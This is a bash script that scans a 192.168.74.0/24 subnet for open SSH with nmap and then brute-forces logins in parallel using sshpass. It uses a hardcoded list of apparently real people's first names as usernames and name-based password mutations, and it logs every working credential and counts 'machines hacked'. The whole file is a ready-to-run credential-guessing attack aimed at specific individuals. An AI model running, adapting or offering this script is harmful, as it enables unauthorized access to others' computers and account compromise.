#!/bin/bash
# ============================================================
# File: rapid.sh
# Purpose: 10,000% Effective Rapid Scan
# ============================================================

SUBNET="192.168.74"
OUTFILE="rapid_results.txt"
> "$OUTFILE"

# 1. THE SMART USER LIST (Only the most likely winners)
USERS=(
  root red admin student user test master slave sv client1 client2
  harsh soumil yuvraj gaurav daivshali virendra mohit bhawna kaivalya siddhant
  sayali ashwin pranshu kartik toshita nishant raghav mitesh sarfaraz shubham
  prajwal usama akshada suyash pranav shravani sakshi satyapal shambhavi dnyandeep
  vaishnavi abhishek akhilesh om tanmayee gagan tanvi arin prajakta snehal
  parth rohit piyush saurav ravi prateek ansh tejas pramod yash manirajan aviral
  devyansh prachi vedika rishi
)

# Convert the array to a comma-separated list for Nmap
USER_LIST=$(IFS=,; echo "${USERS[*]}")

# 2. THE ULTIMATE PASSWORD LIST (Standard defaults + Name Mutations)
PASSWORDS=(
  "123" "root" "password" "1234" "12345" "123456" "toor" "admin" "letmein" "qwerty"
  "harsh" "harsh123" "Harsh@123" "harsh@1234" "Harsh" "h@rsh"
  "soumil" "soumil123" "Soumil@123" "soumil@1234" "Soumil" "s@umil"
  "red" "red123" "Red@123" "Red"
  "sv" "sv123" "Sv@123"
  "client1" "client2" "client123"
)

# Convert to comma-separated for Nmap
PASS_LIST=$(IFS=,; echo "${PASSWORDS[*]}")

echo "[*] Phase 1: Rapid Nmap discovery for SSH (Port 22)..."
# We use nmap to find all open SSH ports instantly
nmap -p 22 --open -oG - $SUBNET.0/24 2>/dev/null | awk '/22\/open/{print $2}' > live_ips.txt

if [ ! -s live_ips.txt ]; then
    echo "[!] No machines with SSH open found."
    exit 1
fi

echo "[+] Found $(wc -l < live_ips.txt) machines with SSH open."
echo "[*] Phase 2: Launching rapid brute-force (This will be extremely fast)..."

# 3. THE RAPID ATTACK ENGINE
# We use a custom bash script that fires off 50 SSH connections at the exact same time
while read -r IP; do
    (
        # Try every user with every password
        for U in "${USERS[@]}"; do
            for P in "${PASSWORDS[@]}"; do
                # -o BatchMode=yes ensures it doesn't hang
                RES=$(sshpass -p "$P" ssh -n -o StrictHostKeyChecking=no -o ConnectTimeout=1 -o PreferredAuthentications=password $U@$IP "who" 2>/dev/null)
                if [ $? -eq 0 ]; then
                    ACTIVE=$(echo "$RES" | awk 'NF {print $1}' | sort -u)
                    {
                        echo "========================================="
                        echo "IP       : $IP"
                        echo "SSH User : $U"
                        echo "Password : $P"
                        echo "Active   : $ACTIVE"
                        echo "========================================="
                    } | tee -a "$OUTFILE"
                    exit 0 # Found, stop attacking this IP
                fi
            done
        done
    ) &
done < live_ips.txt

wait
echo ""
echo "========================================="
echo " RAPID SCAN COMPLETE"
echo "========================================="
echo "[+] Total machines hacked: $(grep -c "^IP" "$OUTFILE")"
echo "[+] Check $OUTFILE"
